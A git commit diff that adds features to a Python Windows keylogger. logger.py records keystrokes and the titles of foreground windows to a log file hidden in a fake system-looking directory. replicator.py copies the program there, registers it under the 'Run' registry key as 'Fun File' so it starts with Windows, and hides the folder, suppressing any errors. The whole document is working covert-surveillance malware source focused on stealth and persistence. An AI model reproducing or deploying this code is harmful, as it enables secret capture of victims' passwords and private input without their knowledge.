f70a3deaf5a2cbc12901ba6a919e3445c8ff62ca
akashsinghsonofgita <max.payne61@gmail.com>
2015-07-25 15:06:25 +0530

    Bugs fixed

--- logger.py
+++ logger.py
@@ -1,9 +1,28 @@
 import sys
 import pythoncom, pyHook
+import win32gui
+
+windowTile = ""
+newWindowTile=""
 
 def OnKeyboardEvent(event):
-	strokes={27:'<Esc>',8:"<Backspace>",9:"<Tab>",13:"<Return>"}
 	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
+	global windowTile
+	global newWindowTile
+	newWindowTile = win32gui.GetWindowText (win32gui.GetForegroundWindow())
+	if( newWindowTile !=  windowTile ) :
+		windowTile = newWindowTile
+		#print windowTile
+		try:
+			f = open (directory_name+'\\log.ob', 'a')
+			tabName="\n"+"\n"+"\n"+"[+]->>"+windowTile+"\n"
+			f.write(tabName)
+			f.close()
+		except:
+			pass
+
+	strokes={27:'<Esc>',8:"<Backspace>",9:"<Tab>",13:"<Return>"}
+
 	if event.Ascii == 5:        # Press Ctrl+E to terminate the keylogger.
 		sys.exit()
 	if event.Ascii != 0:
--- replicator.py
+++ replicator.py
@@ -2,24 +2,47 @@ import os
 import sys
 import shutil
 from _winreg import *
+import ctypes
+
+def hideFolder():
+	FILE_ATTRIBUTE_HIDDEN = 0x02
+
+	ret = ctypes.windll.kernel32.SetFileAttributesW(ur"C:\Windows Files", FILE_ATTRIBUTE_HIDDEN)
+	try:
+		if not ret:
+			raise ctypes.WinError()
+	except:
+		pass
 
 
-def addStartup(file_path):
-	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-	key2change= OpenKey(HKEY_CURRENT_USER,
-	keyVal,0,KEY_ALL_ACCESS)
+def addStartup(file_name):
+	print file_name
+	temp = file_name.split("\\")
+	if len(temp) < 1:
+		temp = file_name.split("/")
+	file_name = temp[-1]
+	print file_name
+	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+	directory_name = r"C:\Windows Files\system 32\drivers\etc\files\host"
+	key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
 
-	SetValueEx(key2change, "Fun File",0,REG_SZ, file_path)
+	SetValueEx(key2change, "Fun File", 0, REG_SZ, directory_name+"\\"+file_name)
 
 
 def replicate():
-	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
-	file_path= sys.argv
+	directory_name = r"C:\Windows Files\system 32\drivers\etc\files\host"
+	file_path = sys.argv
 	if not os.path.exists(directory_name):
 		os.makedirs(directory_name)
-	temp=file_path[0].split("/")
-	file_name=temp[-1]
-	path="\\".join(temp)
-	shutil.copy2(path,directory_name)       #copy the file to location
-	addStartup(directory_name+"\\"+file_name)       #add to startup
+	temp = file_path[0].split("/")
+	if len(temp) < 1:
+		temp = file_path[0].split("\\")
+	file_name = temp[-1]
+	path = "\\".join(temp)
+	try:
+		shutil.copy2(path, directory_name)       # copy the file to location
+		addStartup(directory_name+"\\"+file_name)       # add to startup.
+		hideFolder()                # Hides the fucking folder.
+	except:
+		pass
